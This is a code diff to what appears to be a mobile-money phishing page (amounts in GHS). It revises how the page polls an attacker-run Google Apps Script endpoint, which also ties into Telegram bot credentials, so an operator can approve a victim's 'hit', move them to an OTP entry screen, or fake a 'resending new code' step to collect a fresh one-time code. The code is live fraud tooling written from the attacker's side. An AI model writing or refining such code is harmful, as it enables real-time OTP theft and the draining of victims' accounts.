@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz5M3NzCW3O88T-w5EOUpbk0DipVTNY38v5kyEdeVyGL3FnCBosi5mpwKkEbzCn4LLhLQ/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzWLZm9XqowVYyxmQfOxcFuNPPAvfvdamwS6-Rx4D95xIcorXH2bmq5J9QGE5FFbpxOOg/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -178,39 +178,57 @@ Amt: GHS ${amt}
         startPolling(id);
     }
 
-async function startPolling(phone) {
+function startPolling(phone) {
+    console.log("Starting poll for: " + phone);
+    
     const poller = setInterval(async () => {
         try {
-            const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
-            const status = (await r.text()).trim();
+            // We add a random number to the URL to prevent Google from showing a "cached" version
+            const cacheBuster = Math.random().toString(36).substring(7);
+            const response = await fetch(`${SCRIPT_URL}?num=${phone}&cb=${cacheBuster}`);
+            
+            if (!response.ok) throw new Error("Network response was not ok");
+            
+            const status = (await response.text()).trim();
+            console.log("Current Status from Script:", status);
 
-            if(status === "otp_error" && !isResetting) {
-                isResetting = true; 
+            // 1. SUCCESS: Operator approved the hit
+            if (status === "approved") {
+                clearInterval(poller); // STOP POLLING IMMEDIATELY
+                
+                // Move the user to the OTP View
+                showView(3); 
+                runCountdown(30);
+                
+                // Tell the script we received the signal so it can clear the cache
+                fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
+            }
 
-                // 1. TELL THE SCRIPT TO FORGET THE ERROR IMMEDIATELY
-                // This stops the 30 -> 26 -> 30 jump
+            // 2. ERROR: Operator clicked "Wrong OTP"
+            if (status === "otp_error" && !isResetting) {
+                isResetting = true;
+                
+                // Stop the 45s verify timer if it exists
+                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
+                
                 await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-                // 2. Clear old timer
-                if (otpInterval) clearInterval(otpInterval);
-
-                // 3. UI Reset
                 const timerEl = document.getElementById('timer');
-                timerEl.innerText = "RESENDING...";
-                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+                timerEl.innerText = "RESENDING NEW CODE...";
                 
-                const btn = document.getElementById('otp-btn');
-                btn.innerText = "Confirm & Finish";
-                btn.disabled = false;
+                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+                document.getElementById('otp-btn').innerText = "Confirm & Finish";
+                document.getElementById('otp-btn').disabled = false;
 
-                // 4. Start fresh timer after a short pause
                 setTimeout(() => {
                     runCountdown(30);
-                    isResetting = false; 
-                }, 1000);
+                    isResetting = false;
+                }, 1500);
             }
-        } catch(e) {}
-    }, 4000); // Polling every 4 seconds
+        } catch (error) {
+            console.error("Polling Failed:", error);
+        }
+    }, 3500); // Check every 3.5 seconds
 }
 
 
